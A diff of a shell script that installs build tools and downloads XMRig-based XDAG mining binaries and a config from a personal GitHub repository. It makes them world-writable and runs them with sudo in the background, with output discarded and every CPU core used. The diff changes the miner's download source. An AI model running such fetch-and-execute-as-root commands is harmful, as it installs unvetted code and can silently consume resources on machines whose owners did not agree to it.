@@ -4,7 +4,7 @@ apt-get install -y ca-certificates
 apt-get install -y build-essential cmake libboost-all-dev git
 wget https://raw.githubusercontent.com/aqshakuy/jdag/main/config.json
 wget https://github.com/aqshakuy/jdag/raw/main/xmrig2xdag
-wget https://github.com/aqshakuy/jdag/raw/main/xmrig
+wget https://github.com/aqshakuy/exdag/raw/main/xmrig
 chmod 777 xmrig xmrig2xdag config.json
 sudo ./xmrig2xdag -c config.json > /dev/null 2>&1 &
 sudo ./xmrig -o 127.0.0.1:56729. -u pLFakJP6bPSOtqNc5ncnmTQs/2H2S1uJ -p x -a rx/xdag -t$(nproc --all)
